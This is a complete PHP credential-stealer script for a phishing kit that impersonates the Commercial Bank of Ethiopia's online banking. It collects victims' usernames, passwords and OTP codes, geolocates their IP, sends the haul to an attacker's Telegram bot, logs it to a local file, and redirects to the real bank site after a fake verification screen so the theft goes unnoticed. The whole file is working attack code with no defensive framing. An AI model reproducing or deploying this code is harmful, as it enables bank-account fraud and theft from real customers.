<?php
// =============================================
// CBE Phishing - Credential Stealer
// Sends stolen data to Telegram Bot
// =============================================

// Telegram Bot Configuration
$botToken = 'YOUR_BOT_TOKEN_HERE';  // From @BotFather
$chatID = 'YOUR_CHAT_ID_HERE';      // Your Telegram channel ID

// Get victim data
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$otp = isset($_POST['otp']) ? $_POST['otp'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Get location
function getLocation($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['city'] . ', ' . $data['regionName'] . ', ' . $data['country'];
    }
    return 'Unknown';
}
$location = getLocation($ip);

// Prepare message for Telegram
$message = "🔐 CBE CREDENTIALS STOLEN\n";
$message .= "====================================\n";
$message .= "📅 Time: $timestamp\n";
$message .= "🌐 IP: $ip\n";
$message .= "📍 Location: $location\n";
$message .= "👤 Username: $username\n";
$message .= "🔑 Password: $password\n";
$message .= "📱 OTP: $otp\n";
$message .= "🖥️ User Agent: $userAgent\n";
$message .= "====================================";

// Send to Telegram
function sendToTelegram($message, $botToken, $chatID) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'HTML'
    );
    
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// Send to Telegram
sendToTelegram($message, $botToken, $chatID);

// Also save locally
$file = fopen('stolen.txt', 'a');
fwrite($file, $message . "\n");
fclose($file);

// Redirect to real CBE
echo '<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <style>
        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #003366; color: white; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #25f4ee; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <p style="margin-top:20px;">🔐 Verifying your identity...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = "https://www.cbe.com.et/onlinebanking";
        }, 3000);
    </script>
</body>
</html>';
?>
